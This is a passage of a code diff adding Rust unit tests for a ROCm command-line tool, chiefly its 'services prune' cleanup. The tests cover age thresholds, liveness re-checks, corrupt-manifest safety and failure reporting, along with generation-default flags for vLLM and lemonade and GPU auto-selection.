+    /// that rewrite the record looks newer than the prune run itself, so the
+    /// fail-closed branch keeps it: on a host whose servers died weeks ago and
+    /// have not been listed since, `rocm services prune --yes` removed nothing
+    /// at all and called every one of them too recent to touch.
+    #[test]
+    fn services_prune_default_age_removes_a_record_the_refresh_rewrote() -> Result<()> {
+        let (root, paths) = test_paths("services-prune-refresh-rewrite");
+        paths.ensure()?;
+        // `ready` with a dead pid is the state that triggers the rewrite: the
+        // liveness refresh demotes the status and persists the demotion.
+        let record = plant_service_record(&paths, "svc-long-dead", "ready", 999_999_999)?;
+        let month_ago = SystemTime::now() - Duration::from_hours(24 * 30);
+        fs::File::options()
+            .write(true)
+            .open(&record.manifest_path)?
+            .set_modified(month_ago)?;
+
+        let outcome =
+            prune_managed_service_records(&paths, DEFAULT_SERVICE_PRUNE_MIN_AGE_HOURS, false, true);
+        let outcome = match outcome {
+            Ok(outcome) => outcome,
+            Err(error) => {
+                let _ = fs::remove_dir_all(&root);
+                return Err(error);
+            }
+        };
+        let manifest_exists = record.manifest_path.exists();
+        let _ = fs::remove_dir_all(&root);
+
+        assert!(
+            !manifest_exists,
+            "a record last written a month ago must be pruned even though the \
+             liveness refresh rewrote its manifest during this run:\n{}",
+            outcome.text
+        );
+        assert_eq!(outcome.removed_records, 1);
+        assert_eq!(
+            outcome.skipped_recent, 0,
+            "the refresh's own rewrite must not make a month-old record recent:\n{}",
+            outcome.text
+        );
+        Ok(())
+    }
+
+    /// A cleanup that keeps things silently is indistinguishable from one that
+    /// found nothing, and what it keeps is exactly what a user debugging a fresh
+    /// failure still wants. The count and the way to override it both have to be
+    /// on screen.
+    #[test]
+    fn services_prune_says_how_many_it_kept_for_being_recent() -> Result<()> {
+        let (root, paths) = test_paths("services-prune-recent-report");
+        paths.ensure()?;
+        plant_service_record(&paths, "svc-fresh", "failed", 999_999_999)?;
+
+        let outcome =
+            prune_managed_service_records(&paths, DEFAULT_SERVICE_PRUNE_MIN_AGE_HOURS, false, true);
+        let outcome = match outcome {
+            Ok(outcome) => outcome,
+            Err(error) => {
+                let _ = fs::remove_dir_all(&root);
+                return Err(error);
+            }
+        };
+        let _ = fs::remove_dir_all(&root);
+
+        assert_eq!(outcome.skipped_recent, 1);
+        assert!(
+            outcome.text.contains("  too recent, kept: 1"),
+            "the summary must count what it kept:\n{}",
+            outcome.text
+        );
+        assert!(
+            outcome.text.contains("rocm services prune --any-age --yes"),
+            "the summary must name the flag that includes them:\n{}",
+            outcome.text
+        );
+        Ok(())
+    }
+
+    /// Parse a real `rocm services prune` command line and return exactly what
+    /// the dispatch at `ServicesCommand::Prune` would hand
+    /// [`prune_managed_service_records`]. Nothing here re-implements the flag
+    /// mapping: it runs [`service_prune_min_age_hours`], the same function the
+    /// command uses, so a test driving this covers the wiring and not a copy of
+    /// it.
+    fn parse_services_prune_args(argv: &[&str]) -> Result<(u64, bool, bool)> {
+        let cli = Cli::try_parse_from(argv)?;
+        let Some(Command::Services {
+            command:
+                Some(ServicesCommand::Prune {
+                    older_than_hours,
+                    any_age,
+                    dry_run,
+                    yes,
+                }),
+        }) = cli.command
+        else {
+            bail!("{argv:?} did not parse as `services prune`");
+        };
+        Ok((
+            service_prune_min_age_hours(older_than_hours, any_age),
+            dry_run,
+            yes,
+        ))
+    }
+
+    /// `--any-age` is the reachable form of `--older-than-hours 0`: the summary
+    /// points at it, so it has to actually take the record the default kept.
+    ///
+    /// Driven from the argument vector rather than by passing 0 by hand —
+    /// otherwise this is just another call with `hours = 0` and the flag's only
+    /// wiring, the collapse in [`service_prune_min_age_hours`], is never
+    /// executed by any test.
+    #[test]
+    fn services_prune_any_age_removes_a_just_stopped_record() -> Result<()> {
+        let (root, paths) = test_paths("services-prune-any-age");
+        paths.ensure()?;
+        let record = plant_service_record(&paths, "svc-fresh", "failed", 999_999_999)?;
+
+        let outcome =
+            parse_services_prune_args(&["rocm", "services", "prune", "--any-age", "--yes"])
+                .and_then(|(hours, dry_run, yes)| {
+                    assert_eq!(hours, 0, "--any-age must collapse to the zero-age rule");
+                    assert!(!dry_run);
+                    assert!(yes);
+                    prune_managed_service_records(&paths, hours, dry_run, yes)
+                });
+        let outcome = match outcome {
+            Ok(outcome) => outcome,
+            Err(error) => {
+                let _ = fs::remove_dir_all(&root);
+                return Err(error);
+            }
+        };
+        let manifest_exists = record.manifest_path.exists();
+        let _ = fs::remove_dir_all(&root);
+
+        assert!(
+            !manifest_exists,
+            "--any-age must remove the record the default keeps:\n{}",
+            outcome.text
+        );
+        assert_eq!(outcome.removed_records, 1);
+        assert_eq!(
+            outcome.skipped_recent, 0,
+            "nothing is 'too recent' once the age rule is off:\n{}",
+            outcome.text
+        );
+        Ok(())
+    }
+
+    /// Without the flag the very same parsed command line must keep the record,
+    /// which is what makes the assertion above about `--any-age` and not about
+    /// prune deleting things in general.
+    #[test]
+    fn services_prune_without_any_age_keeps_the_default_threshold() -> Result<()> {
+        let (root, paths) = test_paths("services-prune-no-any-age");
+        paths.ensure()?;
+        let record = plant_service_record(&paths, "svc-fresh", "failed", 999_999_999)?;
+
+        let parsed = parse_services_prune_args(&["rocm", "services", "prune", "--yes"]);
+        let outcome = parsed.and_then(|(hours, dry_run, yes)| {
+            assert_eq!(
+                hours, DEFAULT_SERVICE_PRUNE_MIN_AGE_HOURS,
+                "no --any-age means the default age rule still applies"
+            );
+            prune_managed_service_records(&paths, hours, dry_run, yes)
+        });
+        let outcome = match outcome {
+            Ok(outcome) => outcome,
+            Err(error) => {
+                let _ = fs::remove_dir_all(&root);
+                return Err(error);
+            }
+        };
+        let manifest_exists = record.manifest_path.exists();
+        let _ = fs::remove_dir_all(&root);
+
+        assert!(
+            manifest_exists,
+            "the default must keep it:\n{}",
+            outcome.text
+        );
+        assert_eq!(outcome.removed_records, 0);
+        assert_eq!(outcome.skipped_recent, 1);
+        Ok(())
+    }
+
+    /// `--any-age` and an explicit `--older-than-hours` would be two answers to
+    /// one question; clap has to reject the pair rather than silently pick one.
+    #[test]
+    fn services_prune_rejects_any_age_with_an_explicit_age() {
+        let error = Cli::try_parse_from([
+            "rocm",
+            "services",
+            "prune",
+            "--any-age",
+            "--older-than-hours",
+            "5",
+        ])
+        .expect_err("the two age arguments must conflict");
+        let rendered = error.to_string();
+        assert!(
+            rendered.contains("--any-age") && rendered.contains("--older-than-hours"),
+            "the conflict must name both arguments:\n{rendered}"
+        );
+    }
+
+    /// `collect_service_orphans`' doc comment leans on this: an *unparseable*
+    /// manifest is skipped by `load_managed_services`, so widening the orphan
+    /// rule from "no `<id>.json` on disk" to "no record in the list" would
+    /// delete the log of the one record a user most needs to read, and the
+    /// corrupt manifest with it. Nothing asserted that until now — the other
+    /// tests only ever plant a fully absent manifest.
+    #[test]
+    fn services_prune_keeps_a_corrupt_manifest_and_its_siblings() -> Result<()> {
+        let (root, paths) = test_paths("services-prune-corrupt");
+        paths.ensure()?;
+        let record = plant_service_record(&paths, "svc-corrupt", "failed", 999_999_999)?;
+        // Valid JSON, not a valid record: `serde_json::from_slice` fails, so
+        // `load_managed_services` skips it without reporting an error.
+        fs::write(&record.manifest_path, b"{\"service_id\": 12345}")?;
+        let key_path = endpoint_keys::endpoint_key_file_path(&paths, "svc-corrupt");
+
+        let outcome = prune_managed_service_records(&paths, 0, false, true);
+        let outcome = match outcome {
+            Ok(outcome) => outcome,
+            Err(error) => {
+                let _ = fs::remove_dir_all(&root);
+                return Err(error);
+            }
+        };
+        let manifest_exists = record.manifest_path.exists();
+        let log_exists = record.log_path.exists();
+        let state_exists = record.engine_state_path.exists();
+        let key_exists = key_path.exists();
+        let _ = fs::remove_dir_all(&root);
+
+        assert!(
+            manifest_exists,
+            "a manifest that cannot be parsed must never be deleted:\n{}",
+            outcome.text
+        );
+        assert!(
+            log_exists,
+            "the log of an unreadable record is exactly what a user needs:\n{}",
+            outcome.text
+        );
+        assert!(state_exists, "the engine state must not look orphaned");
+        assert!(key_exists, "the endpoint key must not look orphaned");
+        assert_eq!(outcome.removed_records, 0);
+        assert_eq!(outcome.removed_files, 0);
+        Ok(())
+    }
+
+    /// The status string is not proof of death. `refresh_from_engine_state`
+    /// adopts `failed` straight from the engine's own state file and the
+    /// liveness refresh then returns early for a non-live status, so a server
+    /// whose engine reported failure while its process is still up would be
+    /// removable — taking the log and the 0600 endpoint key of a live process.
+    #[test]
+    fn services_removal_refuses_a_failed_record_whose_process_is_still_alive() -> Result<()> {
+        let (root, paths) = test_paths("services-remove-live-pid");
+        paths.ensure()?;
+        // This test process: a pid that is unambiguously running.
+        let record = plant_service_record(&paths, "svc-zombie", "failed", std::process::id())?;
+
+        let remove_error = remove_managed_service_record(&paths, "svc-zombie", true);
+        let prune = prune_managed_service_records(&paths, 0, false, true);
+        let prune = match prune {
+            Ok(outcome) => outcome,
+            Err(error) => {
+                let _ = fs::remove_dir_all(&root);
+                return Err(error);
+            }
+        };
+        let manifest_exists = record.manifest_path.exists();
+        let _ = fs::remove_dir_all(&root);
+
+        let message = remove_error
+            .err()
+            .map(|error| error.to_string())
+            .unwrap_or_default();
+        assert!(
+            message.contains("cannot be removed while it is running"),
+            "a record with a live pid must be refused whatever its status: {message}"
+        );
+        assert!(manifest_exists, "nothing may be deleted:\n{}", prune.text);
+        assert_eq!(prune.removed_records, 0);
+        assert_eq!(
+            prune.skipped_live, 1,
+            "prune must count it as still running:\n{}",
+            prune.text
+        );
+        Ok(())
+    }
+
+    /// A file `prune` cannot delete must be *reported*, not swallowed and not
+    /// propagated: the plan, the per-record progress and the audit event all
+    /// have to survive it, because a destructive command that loses its own
+    /// account of what it deleted is worse than one that fails. The record whose
+    /// file survived also must not be counted as removed.
+    ///
+    /// A non-empty directory standing where the engine state file belongs is the
+    /// portable way to make `fs::remove_file` fail on both supported hosts; the
+    /// premise is asserted rather than assumed.
+    #[test]
+    fn services_prune_reports_a_file_it_could_not_remove() -> Result<()> {
+        let (root, paths) = test_paths("services-prune-undeletable");
+        paths.ensure()?;
+        let record = plant_service_record(&paths, "svc-stuck", "failed", 999_999_999)?;
+        let stuck = record.engine_state_path.clone();
+        fs::remove_file(&stuck)?;
+        fs::create_dir(&stuck)?;
+        fs::write(stuck.join("held.json"), b"{}")?;
+        assert!(
+            fs::remove_file(&stuck).is_err(),
+            "premise: {} must be undeletable by `remove_file`",
+            stuck.display()
+        );
+
+        let outcome = prune_managed_service_records(&paths, 0, false, true);
+        let outcome = match outcome {
+            Ok(outcome) => outcome,
+            Err(error) => {
+                let _ = fs::remove_dir_all(&root);
+                return Err(error);
+            }
+        };
+        let manifest_exists = record.manifest_path.exists();
+        let stuck_exists = stuck.exists();
+        let _ = fs::remove_dir_all(&root);
+
+        assert!(stuck_exists, "premise: the stuck path must survive");
+        assert!(
+            !manifest_exists,
+            "one unremovable file must not strand the other three:\n{}",
+            outcome.text
+        );
+        assert_eq!(outcome.removed_files, 3);
+        assert_eq!(
+            outcome.removed_records, 0,
+            "a record that still owns a file on disk is not removed:\n{}",
+            outcome.text
+        );
+        assert_eq!(
+            outcome.failures.len(),
+            1,
+            "the failure must be collected so the caller can fail the command:\n{}",
+            outcome.text
+        );
+        assert!(
+            outcome.failures[0].contains(&stuck.display().to_string()),
+            "the failure must name the path: {:?}",
+            outcome.failures
+        );
+        assert!(
+            outcome
+                .text
+                .contains("1 local server record(s) would be removed"),
+            "the plan must still be rendered:\n{}",
+            outcome.text
+        );
+        assert!(
+            outcome.text.contains("1 file(s) could not be removed:"),
+            "the run must say what it could not delete:\n{}",
+            outcome.text
+        );
+        assert!(
+            outcome
+                .text
+                .contains("Re-running is safe: everything already removed stays removed."),
+            "the user needs to know a re-run is not destructive twice over:\n{}",
+            outcome.text
+        );
+        Ok(())
+    }
+
+    /// The window the pre-delete liveness re-check exists to narrow: the plan is
+    /// built from a snapshot, and a `rocm services restart <id> --yes` landing
+    /// between that snapshot and the delete would otherwise have its log and its
+    /// 0600 endpoint key deleted out from under a serving process.
+    ///
+    /// Driven through [`apply_service_prune_plan`] with a hand-built plan
+    /// because the window cannot be opened from outside: `prune` builds and
+    /// applies the plan in one call, so a record is either live for both halves
+    /// or dead for both. The two `skipped_live` assertions elsewhere in this
+    /// module both plant an already-live record, which is satisfied by the
+    /// *plan-building* skip and never reaches this branch.
+    #[test]
+    fn services_prune_leaves_a_record_that_restarted_after_the_plan_was_built() -> Result<()> {
+        let (root, paths) = test_paths("services-prune-relaunched");
+        paths.ensure()?;
+        // Live at apply time. The current process is a guaranteed-live pid.
+        let record = plant_service_record(&paths, "svc-relaunched", "ready", std::process::id())?;
+        // The entry a plan built moments earlier, while the record was still
+        // stopped, would carry into the delete loop.
+        let artifacts = match service_record_artifacts(&paths, "svc-relaunched", "vllm") {
+            Ok(artifacts) => artifacts,
+            Err(error) => {
+                let _ = fs::remove_dir_all(&root);
+                return Err(error);
+            }
+        };
+        let plan = ServicePrunePlan {
+            remove: vec![ServicePruneEntry {
+                service_id: "svc-relaunched".to_owned(),
+                engine: "vllm".to_owned(),
+                status: "stopped".to_owned(),
+                artifacts,
+            }],
+            ..ServicePrunePlan::default()
+        };
+
+        let mut outcome = ServicePruneOutcome::default();
+        apply_service_prune_plan(&paths, &plan, &mut outcome);
+        let manifest_exists = record.manifest_path.exists();
+        let log_exists = record.log_path.exists();
+        let key_exists = endpoint_keys::endpoint_key_file_path(&paths, "svc-relaunched").exists();
+        let _ = fs::remove_dir_all(&root);
+
+        assert!(
+            manifest_exists,
+            "a record that came back to life must not be deleted:\n{}",
+            outcome.text
+        );
+        assert!(
+            log_exists,
+            "the log of a live process must survive:\n{}",
+            outcome.text
+        );
+        assert!(
+            key_exists,
+            "the 0600 endpoint key of a live process must survive:\n{}",
+            outcome.text
+        );
+        assert_eq!(outcome.removed_records, 0);
+        assert_eq!(outcome.removed_files, 0);
+        assert_eq!(
+            outcome.skipped_live, 1,
+            "the re-check's skip must be counted like any other:\n{}",
+            outcome.text
+        );
+        assert!(
+            outcome
+                .text
+                .contains("  svc-relaunched started again while this ran and was left alone."),
+            "the skip must be on screen, not silent:\n{}",
+            outcome.text
+        );
+        Ok(())
+    }
+
+    /// `prunable_by_modified` promises to fail *closed*: a modification time
+    /// that yields no age — a file stamped in the future by clock skew or a
+    /// stray `touch` — is kept, and only the explicit zero-age opt-out overrides
+    /// that. Neither half was asserted anywhere: every other test plants a
+    /// readable past time, for which `is_some_and` and `is_none_or` agree and
+    /// the `min_age.is_zero()` early return is unreachable.
+    #[test]
+    fn services_prune_keeps_a_future_dated_record_until_any_age() -> Result<()> {
+        let (root, paths) = test_paths("services-prune-future-mtime");
+        paths.ensure()?;
+        let record = plant_service_record(&paths, "svc-future", "failed", 999_999_999)?;
+        // `now.duration_since(future)` is an error, so `age_from_modified` has
+        // no age to compare against the threshold.
+        let backdate = |to: SystemTime| -> Result<()> {
+            fs::File::options()
+                .write(true)
+                .open(&record.manifest_path)?
+                .set_modified(to)?;
+            Ok(())
+        };
+        let next_year = SystemTime::now() + Duration::from_hours(24 * 365);
+        backdate(next_year)?;
+        assert!(
+            age_from_modified(path_modified(&record.manifest_path), SystemTime::now()).is_none(),
+            "premise: a future-stamped manifest must have no age"
+        );
+
+        let kept =
+            prune_managed_service_records(&paths, DEFAULT_SERVICE_PRUNE_MIN_AGE_HOURS, false, true);
+        let kept = match kept {
+            Ok(outcome) => outcome,
+            Err(error) => {
+                let _ = fs::remove_dir_all(&root);
+                return Err(error);
+            }
+        };
+        let kept_manifest = record.manifest_path.exists();
+
+        // Re-stamped so the second run really does meet the no-age case rather
+        // than a time the first run's refresh may have rewritten to `now`.
+        // Ignored rather than `?`-ed: if the first run wrongly deleted the
+        // manifest there is nothing left to stamp, and the `kept_manifest`
+        // assertion below has to be what reports that, not an "os error 2".
+        let _ = backdate(next_year);
+        let taken = parse_services_prune_args(&["rocm", "services", "prune", "--any-age", "--yes"])
+            .and_then(|(hours, dry_run, yes)| {
+                assert_eq!(hours, 0, "--any-age must collapse to the zero-age rule");
+                prune_managed_service_records(&paths, hours, dry_run, yes)
+            });
+        let taken = match taken {
+            Ok(outcome) => outcome,
+            Err(error) => {
+                let _ = fs::remove_dir_all(&root);
+                return Err(error);
+            }
+        };
+        let taken_manifest = record.manifest_path.exists();
+        let _ = fs::remove_dir_all(&root);
+
+        assert!(
+            kept_manifest,
+            "a time that cannot be aged must fail closed under the default rule:\n{}",
+            kept.text
+        );
+        assert_eq!(kept.removed_records, 0);
+        assert_eq!(
+            kept.skipped_recent, 1,
+            "the keep must be reported, not silent:\n{}",
+            kept.text
+        );
+        assert!(
+            !taken_manifest,
+            "--any-age is the opt-out that takes it anyway:\n{}",
+            taken.text
+        );
+        assert_eq!(taken.removed_records, 1);
+        assert_eq!(taken.skipped_recent, 0);
+        Ok(())
+    }
+
+    #[test]
+    fn services_prune_requires_yes_unless_dry_run() -> Result<()> {
+        let (root, paths) = test_paths("services-prune-yes");
+        paths.ensure()?;
+        plant_service_record(&paths, "svc-prune-yes", "failed", 999_999_999)?;
+
+        let error = prune_managed_service_records(&paths, 0, false, false)
+            .expect_err("prune without --yes must fail");
+        let manifest_exists = paths.service_manifest_path("svc-prune-yes").exists();
+        let _ = fs::remove_dir_all(&root);
+
+        let message = error.to_string();
+        assert!(message.contains("requires --yes"), "unexpected: {message}");
+        assert!(
+            message.contains("rocm services prune --dry-run"),
+            "the error must name the preview command: {message}"
+        );
+        assert!(manifest_exists, "a refused prune must delete nothing");
+        Ok(())
+    }
+
     #[test]
     fn duplicate_managed_launch_detected_across_distinct_service_ids() -> Result<()> {
         // `generate_service_id` embeds a timestamp, so a second launch for the
@@ -21958,6 +28356,92 @@ install therock";
     }
 
     #[test]
+    fn spawn_managed_engine_child_blocks_reuse_with_mismatched_recipe() -> Result<()> {
+        // A live service recorded with one recipe (e.g. a tool-call parser flag)
+        // must reject a relaunch requesting a different recipe rather than
+        // silently reusing the old server, and the error must not claim the
+        // mismatch is specifically about generation defaults when it could stem
+        // from any recipe field.
+        let (root, paths) = test_paths("dup-managed-recipe-mismatch");
+        paths.ensure()?;
+        let mut existing = ManagedServiceRecord::new(
+            &paths,
+            "lemonade-qwen-1000",
+            "lemonade",
+            "qwen",
+            "qwen-canonical",
+            "127.0.0.1",
+            11510,
+            "managed",
+            std::process::id(),
+            None,
+            None,
+            None,
+        );
+        existing.status = "ready".to_owned();
+        existing.engine_pid = Some(std::process::id());
+        existing.engine_recipe_json = Some(serde_json::to_string(&EngineRecipeHint {
+            contract_version: ENGINE_RECIPE_CONTRACT_VERSION.to_owned(),
+            engine: "lemonade".to_owned(),
+            required_flags: vec!["--tool-call-parser".to_owned(), "hermes".to_owned()],
+            ..EngineRecipeHint::default()
+        })?);
+        existing.write()?;
+
+        let resolve = ResolveModelResponse {
+            canonical_model_id: "qwen-canonical".to_owned(),
+            task: "chat".to_owned(),
+            source: "hf".to_owned(),
+            revision: "main".to_owned(),
+            loader: "llama.cpp".to_owned(),
+            trust_remote_code: false,
+            chat_template_mode: "auto".to_owned(),
+            dtype: "auto".to_owned(),
+            device_policy: DevicePolicy::GpuPreferred,
+            estimated_memory: "unknown".to_owned(),
+            launch_defaults: serde_json::json!({}),
+            engine_recipe: None,
+            warnings: Vec::new(),
+        };
+        let requested_recipe = EngineRecipeHint {
+            contract_version: ENGINE_RECIPE_CONTRACT_VERSION.to_owned(),
+            engine: "lemonade".to_owned(),
+            required_flags: vec!["--temperature".to_owned(), "0.5".to_owned()],
+            ..EngineRecipeHint::default()
+        };
+
+        let result = spawn_managed_engine_child(
+            &paths,
+            "lemonade",
+            "lemonade-qwen-2000",
+            "qwen",
+            &resolve,
+            "127.0.0.1",
+            11511,
+            &resolve.device_policy,
+            &[],
+            None,
+            None,
+            Some(&requested_recipe),
+        );
+        let _ = fs::remove_dir_all(root);
+
+        let Err(error) = result else {
+            panic!("mismatched recipe on a live service must be rejected")
+        };
+        let message = error.to_string();
+        assert!(
+            message.contains("different serve options"),
+            "message should describe the mismatch generically: {message}"
+        );
+        assert!(
+            message.contains("recipe hint, tool-call parser, or generation defaults"),
+            "message should not single out generation defaults as the sole cause: {message}"
+        );
+        Ok(())
+    }
+
+    #[test]
     fn services_tool_result_text_includes_running_interpretation() {
         let (_root, paths) = test_paths("services-tool-text");
         let mut record = ManagedServiceRecord::new(
@@ -22028,6 +28512,44 @@ install therock";
             .expect("services stop should accept --yes");
         Cli::try_parse_from(["rocm", "services", "restart", "svc-qwen", "--yes"])
             .expect("services restart should accept --yes");
+    }
+
+    #[test]
+    fn update_dry_run_does_not_require_apply() {
+        Cli::try_parse_from(["rocm", "update", "--dry-run"])
+            .expect("update --dry-run should parse without --apply");
+        Cli::try_parse_from(["rocm", "update", "--apply", "--dry-run"])
+            .expect("update --apply --dry-run should still parse");
+        Cli::try_parse_from(["rocm", "update", "--dry-run", "--runtime", "rocm-6.2"])
+            .expect("update --dry-run --runtime should parse without --apply");
+        Cli::try_parse_from(["rocm", "update", "--dry-run", "--activate"])
+            .expect("update --dry-run --activate should parse without --apply");
+    }
+
+    #[test]
+    fn update_dry_run_conflicts_with_json() {
+        Cli::try_parse_from(["rocm", "update", "--dry-run", "--json"]).expect_err(
+            "update --dry-run --json should be rejected instead of silently dropping --json",
+        );
+    }
+
+    // This only pins the free predicate's truth table. The actual dispatch
+    // wiring — that `rocm update --dry-run` really does reach the preview
+    // path without requiring --apply — is covered by e2e scenario
+    // `update-dry-run-reaches-preview-path-without-apply`
+    // (tests/e2e-cucumber/features/update.feature).
+    #[test]
+    fn update_should_preview_or_apply_includes_dry_run() {
+        assert!(
+            !update_should_preview_or_apply(false, false),
+            "plain `rocm update` should stay on the read-only status report"
+        );
+        assert!(
+            update_should_preview_or_apply(false, true),
+            "the predicate must say dry-run alone should preview"
+        );
+        assert!(update_should_preview_or_apply(true, false));
+        assert!(update_should_preview_or_apply(true, true));
     }
 
     #[test]
@@ -22135,7 +28657,13 @@ install therock";
 
         let rendered = reset_setup_prompt_state(&paths, &mut config)?;
 
-        assert!(rendered.contains("Setup will show again"));
+        // The claim itself (onboarding only opens via an explicit `n` on the
+        // Observe tab, never automatically) is proven by
+        // `crates/rocm-dash-tui/src/app/mod.rs`'s
+        // `startup_focus_gate_only_opens_onboarding_for_explicit_setup_focus`
+        // test and the `onboarding.rs` module doc — this assertion only
+        // guards the string, not the behavior.
+        assert!(rendered.contains("Onboarding will not reopen automatically"));
         assert!(rendered.contains("ROCm installs were not deleted"));
         assert!(rendered.contains("API keys"));
         assert!(!rendered.contains("request plan"));
@@ -22206,7 +28734,10 @@ install therock";
 
         let rendered = render_setup_status_text(&paths, &config)?;
 
-        assert!(rendered.contains("status: first-time setup will show"));
+        // See the pointer comment in
+        // `setup_reset_cli_output_is_plain_and_persists_first_time_prompt`
+        // above: this only guards the string, not the underlying behavior.
+        assert!(rendered.contains("status: first-time setup available — open manually"));
         assert!(rendered.contains("active_runtime_status: <unset>"));
         Ok(())
     }
@@ -22959,6 +29490,173 @@ install therock";
     }
 
     #[test]
+    fn generation_defaults_inject_override_generation_config_for_vllm() {
+        // vLLM has no raw sampling flags: all three controls collapse into a single
+        // `--override-generation-config` JSON with `--max-tokens` mapped to the
+        // engine's `max_new_tokens` output cap.
+        let hint = engine_recipe_with_generation_defaults(
+            "vllm",
+            None,
+            ServeGenerationDefaults {
+                temperature: Some(0.5),
+                top_p: Some(0.25),
+                max_tokens: Some(128),
+            },
+        )
+        .expect("vllm defaults are supported")
+        .expect("supplied defaults should synthesize a vllm hint");
+        assert_eq!(hint.engine, "vllm");
+        assert_eq!(hint.required_flags.len(), 2);
+        assert_eq!(hint.required_flags[0], "--override-generation-config");
+        let config: serde_json::Value =
+            serde_json::from_str(&hint.required_flags[1]).expect("config is valid JSON");
+        assert_eq!(config["temperature"], 0.5);
+        assert_eq!(config["top_p"], 0.25);
+        assert_eq!(config["max_new_tokens"], 128);
+    }
+
+    #[test]
+    fn generation_defaults_include_only_supplied_values() {
+        // Unset controls are omitted so the engine keeps its own defaults.
+        let hint = engine_recipe_with_generation_defaults(
+            "vllm",
+            None,
+            ServeGenerationDefaults {
+                temperature: Some(0.25),
+                top_p: None,
+                max_tokens: None,
+            },
+        )
+        .expect("vllm defaults are supported")
+        .expect("a single supplied default still synthesizes a hint");
+        let config: serde_json::Value =
+            serde_json::from_str(&hint.required_flags[1]).expect("config is valid JSON");
+        assert_eq!(config["temperature"], 0.25);
+        assert!(config.get("top_p").is_none());
+        assert!(config.get("max_new_tokens").is_none());
+    }
+
+    #[test]
+    fn generation_defaults_merge_with_recipe_authored_config() {
+        // CLI values win, but authored keys the CLI does not set are preserved and
+        // exactly one `--override-generation-config` pair remains.
+        let authored = EngineRecipeHint {
+            contract_version: ENGINE_RECIPE_CONTRACT_VERSION.to_owned(),
+            engine: "vllm".to_owned(),
+            required_flags: vec![
+                "--enable-auto-tool-choice".to_owned(),
+                "--override-generation-config".to_owned(),
+                "{\"temperature\":0.9,\"repetition_penalty\":1.1}".to_owned(),
+            ],
+            ..EngineRecipeHint::default()
+        };
+        let hint = engine_recipe_with_generation_defaults(
+            "vllm",
+            Some(authored),
+            ServeGenerationDefaults {
+                temperature: Some(0.25),
+                top_p: Some(0.5),
+                max_tokens: None,
+            },
+        )
+        .expect("vllm defaults are supported")
+        .unwrap();
+        assert_eq!(
+            hint.required_flags
+                .iter()
+                .filter(|flag| *flag == "--override-generation-config")
+                .count(),
+            1
+        );
+        assert_eq!(hint.required_flags[0], "--enable-auto-tool-choice");
+        let config: serde_json::Value =
+            serde_json::from_str(hint.required_flags.last().unwrap()).unwrap();
+        assert_eq!(config["temperature"], 0.25);
+        assert_eq!(config["top_p"], 0.5);
+        assert_eq!(config["repetition_penalty"], 1.1);
+    }
+
+    #[test]
+    fn generation_defaults_absent_or_non_vllm_pass_through() {
+        // No controls supplied: the hint flows through unchanged.
+        assert!(
+            engine_recipe_with_generation_defaults(
+                "vllm",
+                None,
+                ServeGenerationDefaults::default()
+            )
+            .unwrap()
+            .is_none()
+        );
+        assert!(
+            engine_recipe_with_generation_defaults(
+                "unknown",
+                None,
+                ServeGenerationDefaults {
+                    temperature: Some(0.5),
+                    top_p: Some(0.5),
+                    max_tokens: Some(64),
+                },
+            )
+            .is_err()
+        );
+    }
+
+    #[test]
+    fn generation_defaults_translate_to_lemonade_llama_server_flags() {
+        let hint = engine_recipe_with_generation_defaults(
+            "lemonade",
+            None,
+            ServeGenerationDefaults {
+                temperature: Some(0.5),
+                top_p: Some(0.25),
+                max_tokens: Some(128),
+            },
+        )
+        .expect("lemonade defaults are supported")
+        .expect("defaults synthesize a recipe");
+        assert_eq!(
+            hint.required_flags,
+            [
+                "--temperature",
+                "0.5",
+                "--top-p",
+                "0.25",
+                "--n-predict",
+                "128"
+            ]
+        );
+    }
+
+    #[test]
+    fn generation_defaults_preserve_unset_lemonade_recipe_flags() {
+        // Only --temperature is supplied via CLI; an authored --top-p already
+        // present in the recipe must survive untouched, mirroring the vLLM
+        // merge behavior instead of being deleted.
+        let authored = EngineRecipeHint {
+            contract_version: ENGINE_RECIPE_CONTRACT_VERSION.to_owned(),
+            engine: "lemonade".to_owned(),
+            required_flags: vec!["--top-p".to_owned(), "0.9".to_owned()],
+            ..EngineRecipeHint::default()
+        };
+        let hint = engine_recipe_with_generation_defaults(
+            "lemonade",
+            Some(authored),
+            ServeGenerationDefaults {
+                temperature: Some(0.5),
+                top_p: None,
+                max_tokens: None,
+            },
+        )
+        .expect("lemonade defaults are supported")
+        .expect("supplied defaults should synthesize a hint");
+        assert_eq!(
+            hint.required_flags,
+            ["--top-p", "0.9", "--temperature", "0.5"]
+        );
+    }
+
+    #[test]
     fn engine_recipe_enables_tool_choice_reflects_flags() {
         assert!(!engine_recipe_enables_tool_choice(None));
         let without = EngineRecipeHint {
@@ -23002,7 +29700,7 @@ install therock";
             vram(2, 500, 192_000),
         ];
         assert_eq!(
-            select_auto_gpu_index(Some(3), &[], Some(&usage)),
+            select_auto_gpu_index(Some(3), None, &[], Some(&usage)),
             vec![1],
             "should skip the busy GPU 0 and pick the lowest idle GPU"
         );
@@ -23018,7 +29716,7 @@ install therock";
             vram(2, 60_000, 192_000),
         ];
         assert_eq!(
-            select_auto_gpu_index(Some(3), &[0], Some(&usage)),
+            select_auto_gpu_index(Some(3), None, &[0], Some(&usage)),
             vec![2],
             "with no idle GPU, pick the non-busy GPU with the most free VRAM"
         );
@@ -23032,7 +29730,7 @@ install therock";
         // but far more free memory. Auto-selection must prefer GPU 1.
         let usage = [vram(0, 6_000, 24_000), vram(1, 100_000, 192_000)];
         assert_eq!(
-            select_auto_gpu_index(Some(2), &[], Some(&usage)),
+            select_auto_gpu_index(Some(2), None, &[], Some(&usage)),
             vec![1],
             "pass 2 should rank by absolute free VRAM, not free percentage"
         );
@@ -23040,26 +29738,148 @@ install therock";
 
     #[test]
     fn auto_selection_falls_back_to_first_non_busy_without_vram() {
-        assert_eq!(select_auto_gpu_index(Some(4), &[0, 1], None), vec![2]);
+        assert_eq!(select_auto_gpu_index(Some(4), None, &[0, 1], None), vec![2]);
         // Unknown GPU count: no GPU-0 fallback — defer to the engine device probe.
-        assert_eq!(select_auto_gpu_index(None, &[], None), Vec::<u32>::new());
+        assert_eq!(
+            select_auto_gpu_index(None, None, &[], None),
+            Vec::<u32>::new()
+        );
+    }
+
+    #[test]
+    fn auto_selection_restricts_candidates_to_visible_set() {
+        // GPUs 0 and 1 are masked out (only 2 and 3 visible). With no VRAM data
+        // auto-select must pick the lowest *visible* ordinal, never a hidden one.
+        assert_eq!(
+            select_auto_gpu_index(Some(4), Some(&[2, 3]), &[], None),
+            vec![2],
+            "selection must stay inside the visibility mask"
+        );
+        // The lowest visible GPU (2) is busy, so fall through to the next visible.
